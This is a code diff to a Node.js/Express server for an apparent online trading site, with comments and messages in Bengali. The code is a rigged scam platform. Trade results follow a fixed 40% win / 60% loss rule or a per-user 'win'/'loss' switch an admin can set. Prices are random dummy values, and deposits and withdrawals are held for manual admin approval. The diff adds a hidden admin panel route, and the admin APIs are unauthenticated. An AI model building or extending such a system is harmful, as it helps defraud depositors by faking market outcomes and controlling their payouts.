@@ -10,20 +10,20 @@ const wss = new WebSocket.Server({ server });
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ইন-মেমোরি ডেটাবেজ
+// ইন-মেমোরি ডাটাবেজ
 let users = {
-  "demo_user": { balance: 1000, control: "normal" } // control: 'normal', 'win', 'loss'
+  "demo_user": { balance: 1000, control: "normal" } 
 };
 
-let transactions = []; // ডিপোজিট ও উইথড্রল লিস্ট
+let transactions = [];
 
-// ট্রেড লজিক (৪০% উইন, ৬০% লস অথবা অ্যাডমিন কন্ট্রোল)
+// ট্রেড লজিক (৪০% উইন, ৬০% লস বা অ্যাডমিন কন্ট্রোল)
 app.post('/api/trade', (req, res) => {
   const { username, amount, timeframe } = req.body;
   let user = users[username] || { balance: 1000, control: 'normal' };
 
   if (user.balance < amount) {
-    return res.json({ success: false, message: "Insufficient balance" });
+    return res.json({ success: false, message: "অপর্যাপ্ত ব্যালেন্স!" });
   }
 
   let isWin = false;
@@ -46,49 +46,51 @@ app.post('/api/trade', (req, res) => {
   res.json({ success: true, isWin, balance: user.balance, profit });
 });
 
-// ডিপোজিট রিকোয়েস্ট সাবমিট
+// ডিপোজিট রিকোয়েস্ট
 app.post('/api/deposit', (req, res) => {
   const { username, method, amount, trxId } = req.body;
   transactions.push({ id: Date.now(), username, type: 'Deposit', method, amount, trxId, status: 'Pending' });
-  res.json({ success: true, message: "Deposit request submitted successfully!" });
+  res.json({ success: true, message: "ডিপোজিট রিকোয়েস্ট সফলভাবে জমা হয়েছে!" });
 });
 
-// উইথড্রল রিকোয়েস্ট সাবমিট
+// উইথড্রল রিকোয়েস্ট
 app.post('/api/withdraw', (req, res) => {
   const { username, method, amount, accountNo } = req.body;
   let user = users[username];
   if(user && user.balance >= amount) {
     user.balance -= Number(amount);
     transactions.push({ id: Date.now(), username, type: 'Withdraw', method, amount, accountNo, status: 'Pending' });
-    res.json({ success: true, message: "Withdrawal request submitted!" });
+    res.json({ success: true, message: "উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে!" });
   } else {
-    res.json({ success: false, message: "Invalid balance or amount!" });
+    res.json({ success: false, message: "পর্যাপ্ত ব্যালেন্স নেই!" });
   }
 });
 
-// অ্যাডমিন প্যানেল ডাটা API
+// সিক্রেট অ্যাডমিন পেজ রুট (ইউজার সাইট থেকে আলাদা)
+app.get('/admin-secret-panel', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+// অ্যাডমিন ডাটা API
 app.get('/api/admin/data', (req, res) => {
   let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
   let totalWithdraw = transactions.filter(t => t.type === 'Withdraw' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
-  
   res.json({ users, transactions, totalDeposit, totalWithdraw });
 });
 
-// অ্যাডমিন ইউজার কন্ট্রোল (Win/Loss/Ban)
+// অ্যাডমিন অ্যাকশন
 app.post('/api/admin/action', (req, res) => {
-  const { username, action, value } = req.body; // action: 'control', 'status'
+  const { username, action, value } = req.body;
   if(users[username]) {
-    if(action === 'control') users[username].control = value; // 'win', 'loss', 'normal'
-    if(action === 'status') users[username].status = value;     // 'active', 'banned'
+    if(action === 'control') users[username].control = value;
     res.json({ success: true });
   } else {
-    res.json({ success: false, message: "User not found" });
+    res.json({ success: false });
   }
 });
 
-// ডিপোজিট/উইথড্র অ্যাপ্রুভ বা রিজেক্ট
 app.post('/api/admin/tx-action', (req, res) => {
-  const { txId, status } = req.body; // status: 'Approved', 'Rejected'
+  const { txId, status } = req.body;
   let tx = transactions.find(t => t.id == txId);
   if(tx) {
     tx.status = status;
@@ -98,7 +100,7 @@ app.post('/api/admin/tx-action', (req, res) => {
   }
 });
 
-// রিয়েল-টাইম প্রাইস ফিড
+// রিয়েল-टाइम প্রাইস ফিড
 wss.on('connection', (ws) => {
   setInterval(() => {
     let dummyPrice = (1.0800 + Math.random() * 0.0050).toFixed(4);
